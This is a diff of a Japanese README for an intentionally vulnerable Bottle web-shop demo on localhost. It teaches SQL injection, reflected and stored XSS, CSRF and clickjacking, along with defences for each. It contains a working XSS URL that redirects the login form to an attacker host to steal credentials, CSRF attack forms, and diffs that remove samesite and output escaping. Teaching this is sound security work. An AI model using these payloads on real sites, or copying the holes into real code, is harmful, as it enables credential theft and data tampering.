@@ -2,7 +2,7 @@
 
 PythonのマイクロフレームワークBottleを使ったECサイトのデモンストレーションです。ソースコードにわざと脆弱性を仕込むことで、どんな攻撃が可能になるかを示していきます。
 
-Windowsを利用する前提で説明します。
+OSはWindows、WebブラウザーはFirefoxを利用する前提で説明します。
 
 デモンストレーションを理解するのに必要な基礎知識は次の通りです：
 
@@ -44,22 +44,34 @@ Python3のインストールが完了したら、仮想環境を作ります。�
 (venv)> set STORE_SECRET_KEY=<署名付きcookieのための鍵（文字列）>
 ```
 
-サーバーを起動します。localhost:8080で立ち上がります。環境変数を設定し忘れていると、RuntimeErrorが発生して起動できないのでご注意ください。
+ECサイトを起動します。localhost:8080で立ち上がります。環境変数を設定し忘れていると、RuntimeErrorが発生して起動できないのでご注意ください。
 
 ```console
 (venv)> py app.py
 ```
 
-Webブラウザーで http://localhost:8080/ にアクセスすると使えます。
+Firefoxで http://localhost:8080/ にアクセスすると使えます。
 
-ユーザー1でログインしてみます。
+利用者1でログインしてみます。
 
 - メールアドレス
   - user1@example.com
 - パスワード
   - password1
 
-なおChromeでこのパスワードを使うと「パスワードを変更してください（パスワードが漏洩しました）」という警告が表示されます。
+ログインに成功すると、商品一覧が表示されます。
+
+```
+http://localhost:8080/products
+```
+
+商品の詳細ページからレビューを投稿できます。
+
+```
+http://localhost:8080/products/1
+```
+
+なお、購入は簡易的な実装で、アラートが表示されるだけです。
 
 ## ここから先の注意事項
 
@@ -74,7 +86,7 @@ Webブラウザーで http://localhost:8080/ にアクセスすると使えま�
 +        results = cur.execute("SELECT * FROM rated_products WHERE name LIKE '%" + query + "%'").fetchall()
 ```
 
-Webブラウザーで商品一覧を表示します。
+Firefoxで商品一覧を表示します。
 
 ```
 http://localhost:8080/products
@@ -157,23 +169,31 @@ http://localhost:8080/login?message=<s>hello</s>
 http://localhost:8080/login?message=<script>alert(1)</script>
 ```
 
-```1```がアラートされ、スクリプトの混入に成功したことが分かります。攻撃者は自分のサイトを立ち上げ、ログイン画面に入力された情報を盗み出そうとします。まず、盗み出した情報を取得するWebアプリを起動します。別のコマンドプロンプトを立ち上げて、```evil.py```を実行してください。攻撃者のWebアプリは、localhost の 8081 ポートで起動します。
+```1```がアラートされ、スクリプトの混入に成功したことが分かります。攻撃者は自分のサイトを立ち上げ、ログイン画面に入力された情報を盗み出そうとします。まず、盗み出した情報を取得するWebアプリを起動します。別のコマンドプロンプトを立ち上げて、```evil.py```を実行してください。攻撃者のWebアプリは、evil.localtest.meというホスト名の8081ポートで起動します。
+
+ここで```localtest.me```というドメイン名は、DNSによってループバックアドレス```127.0.0.1```として解決されます。なので、Firefoxで```*.localtest.me```へのアクセスするのは、localhostにアクセスするのと同じです。
+
+localhostに別名を与えるのによく使うのはhostsファイルですが、管理者権限でhostsファイルを編集する必要がないので便利です。他には```lvh.me```というドメインが有名です。
+
+> Scott Forsyth's Blog - Introducing Testing Domain - localtest.me
+> 
+> https://weblogs.asp.net/owscott/introducing-testing-domain-localtest-me
 
 ```console
 > .\venv\Scripts\activate
 (venv)> py evil.py
 ```
 
-攻撃者はログイン画面にスクリプトを混入することで、同じログイン画面にもかかわらず、データの向き先を変更できてしまいます。次のURLをクリックすると、向き先の変わったログイン画面が表示されます。
+攻撃者はログイン画面にスクリプトを混入することで、同じログイン画面にもかかわらず、データの向き先を変更できてしまいます。正規の利用者が次のURLをクリックすると、画面上は何も変わりがありませんが、向き先の変わったログイン画面が表示されます。
 
 ```
-http://localhost:8080/login?message=<script>window.onload=function(){document.querySelector('form').action='http://localhost:8081/users'}</script>
+http://localhost:8080/login?message=<script>window.onload=function(){document.querySelector('form').action='http://evil.localtest.me:8081/users'}</script>
 ```
 
-もし正規のユーザーがこのURLを開いてしまうと、入力した情報が攻撃者に渡ってしまいます。攻撃者が盗み出した情報は、次の方法で確認できます。
+利用者が送信ボタンを押してしまうと入力した情報が攻撃者に渡ってしまいます。攻撃者が盗み出した情報は、Firefoxで確認できます。
 
 ```
-http://localhost:8081/users
+http://evil.localtest.me:8081/users
 ```
 
 ### XSSを防ぐには
@@ -198,24 +218,28 @@ Webブラウザーが持つセキュリティ機能を、Webアプリ側が強�
 
 ## クロスサイト・リクエストフォージェリ（CSRF）と蓄積型クロスサイトスクリプティング（Persistent XSS）の合わせ技
 
-```app.py```を次のよう書き換えます。```form_token```と```cookie_token```のチェックをなくします。```form_token```はフォームに埋め込んだトークンです。フォームに情報が投稿されるときに一緒にWebアプリに渡されます。同じ値が署名付きcookieに格納されていて、Webアプリはそれぞれが同じ値かどうかをチェックしています。
+```app.py```を次のよう書き換えます。うっかりクッキーのsamesite属性を指定し忘れてしまいました。外部サイトに設置されたフォームからPOSTメソッドで正規のサイトにリクエストを出した時に、正規サイトのクッキーをそのリクエストに付与してしまいます。
 
 ```diff:app.py
--    if form_token != cookie_token:
--        abort(400, '不正なアクセスです。')
-+    #if form_token != cookie_token:
-+    #    abort(400, '不正なアクセスです。')
+-    response.set_cookie('user_id', user_id, secret=SECRET_KEY, path='/', httponly=True, samesite='lax')
+-    response.set_cookie('nickname', nickname, secret=SECRET_KEY, path='/', httponly=True, samesite='lax')
++    response.set_cookie('user_id', user_id, secret=SECRET_KEY, path='/', httponly=True)
++    response.set_cookie('nickname', nickname, secret=SECRET_KEY, path='/', httponly=True)
 ```
 
-ユーザーがWebブラウザーでフォームを開いてから情報を投稿するのが正規の流れですが、それ以外のやり方で投稿できるようになってしまいました。
+利用者がWebブラウザーで正規のサイトのフォームを開いてから情報を投稿するのが正規の流れですが、それ以外のやり方で投稿できるようになってしまいました。
 
-攻撃者は攻撃サイトを準備し、甘い言葉で正規のユーザーにクリックを促します。
+> samesite | Cookies(クッキー), document.cookie
+> 
+> https://ja.javascript.info/cookie#ref-497
+
+攻撃者は攻撃サイトを準備し、甘い言葉で正規の利用者にクリックを促します。
 
 ```
-http://localhost:8081/evil_game1
+http://evil.localtest.me:8081/game1
 ```
 
-クリックすると、ユーザーが意図しない投稿をしてしまうフォームになっています。評価を釣り上げる作戦です。
+クリックすると、利用者が意図しない投稿をしてしまうフォームになっています。評価を釣り上げる作戦です。
 
 ```html
 <form action="http://localhost:8080/reviews" method="post">
@@ -227,11 +251,17 @@ http://localhost:8081/evil_game1
 </form>
 ```
 
-ユーザーはゲームで遊ぼうと攻撃者のサイトでボタンをクリックしただけなのに、商品1に高評価をつけてしまいます。ユーザーに意図しない情報を投稿させてしまう攻撃がクロスサイト・リクエストフォージェリ（CSRF）です。なお、user_idはSQLインジェクションで入手した情報を使っている前提です。
+利用者はゲームで遊ぼうと攻撃者のサイトでボタンをクリックしただけなのに、商品1に高評価をつけてしまいます。別のサイトに利用者をアクセスさせて、利用者が意図しない投稿をさせてしまう攻撃がクロスサイト・リクエストフォージェリ（CSRF）です。
+
+攻撃者の準備したフォームにあるuser_idはSQLインジェクションで入手したものを使っている前提です。
+
+意図しない投稿は商品1のレビューです。確認してみます。
 
 ```
 http://localhost:8080/products/1
 ```
+
+なお、Chromeの場合はこの攻撃が成立せず、ログインが求められることになります。Chromeの場合、クッキーのsamesite属性が指定されていないリクエストは、```samesite='lax'```が指定されたものとして扱うためです。
 
 さらに```app.py```を書き換え、```comment```のエスケープを外します。これで、商品の詳細ページにXSSが可能になってしまいます。
 
@@ -240,13 +270,13 @@ http://localhost:8080/products/1
 +        <li>{{ !comment }}</li>
 ```
 
-攻撃者は攻撃サイトを準備し、甘い言葉で正規のユーザーにクリックを促します。
+攻撃者は攻撃サイトを準備し、甘い言葉で正規の利用者にクリックを促します。
 
 ```
-http://localhost:8081/evil_game2
+http://evil.localtest.me:8081/game2
 ```
 
-クリックすると、ユーザーが意図しない投稿をしてしまうフォームになっています。評価を釣り上げるだけでなく、XSSでページを書き換え、うその金額に変更してしまいます。window.onload はページの読み込みが終了すると実行されます。
+クリックすると、利用者が意図しない投稿をしてしまうフォームになっています。評価を釣り上げるだけでなく、XSSを埋め込んでうその金額にページを書き換えてしまいます。window.onload はページの読み込みが終了すると実行されます。
 
 ```html
 <form action="http://localhost:8080/reviews" method="post">
@@ -261,13 +291,13 @@ http://localhost:8081/evil_game2
 </form>
 ```
 
-ユーザーが意図せずに投稿してしまったスクリプト付きコメントは、ユーザー本人はもちろん、他のユーザーがこのコメントを閲覧した時にも実行されてしまいます。
+利用者が意図せずに投稿してしまったスクリプト付きコメントは、利用者本人はもちろん、他の利用者がこのコメントを閲覧した時にも実行され、金額を書き換えてしまいます。
 
 反射型XSSは、スクリプトが仕込まれたURLをクリックした人だけに影響しました。しかし、蓄積型XSSはその他すべての人に影響してしまいます。
 
 ### CSRFを防ぐには
 
-ユーザーが投稿する情報にtokenを埋め込み、正規の投稿かどうかを確認しましょう。
+利用者が投稿する情報にtokenを埋め込み、正規の投稿かどうかを確認しましょう。
 
 ## クリックジャッキング（Clickjacking）
 
@@ -280,20 +310,19 @@ HTMLの```\<iframe\>```タグを使うことで、別のサイトのWebページ
 +   response.headers['X-Frame-Option'] = 'DENY'
 ```
 
-攻撃者は攻撃サイトを準備し、甘い言葉で正規のユーザーにクリックを促します。
+攻撃者は攻撃サイトを準備し、甘い言葉で正規の利用者にクリックを促します。
 
 ```
-http://localhost:8081/evil_game3
+http://evil.localtest.me:8081/game3
 ```
 
-攻撃サイト上には、iframeで商品一覧ページが表示されていますが、消すチェックボックスを有効にすると、商品一覧ページが消えてしまいます。実際は消えているのではなく、CSSで透明度を変更し、見えなくしているだけで、そこに存在しています。正規のユーザーがボタンをクリックすると、勝手に商品を購入してしまいます。
+攻撃サイト上には、iframeで商品一覧ページが表示されていますが、消すチェックボックスを有効にすると、商品一覧ページが消えてしまいます。実際は消えているのではなく、CSSで透明度を変更し、見えなくしているだけで、そこに存在しています。正規の利用者がボタンをクリックすると、勝手に商品を購入してしまいます。
 
 クリックする対象を隠すことで、意図しない結果を誘発するこの攻撃手法はクリックジャッキングと呼ばれています。
 
 ### Clickjackingを防ぐには
 
 X-Frame-Optionsヘッダーを正しく設定しましょう！
-
 
 ## ツールを活用しよう！
 
